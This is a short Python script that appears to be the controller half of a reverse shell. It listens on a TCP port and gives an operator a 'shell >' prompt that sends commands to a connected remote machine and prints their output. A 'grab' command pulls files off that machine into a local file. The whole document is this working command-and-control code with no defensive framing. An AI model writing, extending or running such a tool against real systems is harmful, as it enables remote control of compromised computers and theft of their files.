
# TCP SERVER

import socket  # for building TCP connection


# host and port
HOST = "127.0.0.1"
PORT = 8080


# transfer files
def transfer(conn, command):

    conn.send(command.encode())
    f = open("test.txt", "w")

    while True:
        print("[+] Recieving files...")
        bits = conn.recv(1024)
        print("[+]" + bits.decode())

        if "Unable to find out the file" in bits.decode():
            print("[+] File not found")
            break

        if bits.decode().endswith("DONE"):
            print("[+] Transfer completed")
            f.close()
            break

        f.write(bits.decode())

    f.close()


# initalize connection and send commands
def connect():

    print("[+] Listening for TCP connection on PORT " + str(PORT))
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((HOST, PORT))
    s.listen(1)

    conn, addr = s.accept()
    print("[+] Got a connection from: ", addr)

    while True:

        command = input("shell > ")

        if "terminate" in command:
            conn.send("Closing connection...".encode())
            conn.close()
            break

        elif "grab" in command:
            transfer(conn, command)

        else:
            conn.send(command.encode())
            print(conn.recv(1024).decode())


# main function, runs connection
def main():
    connect()


# run main()
main()
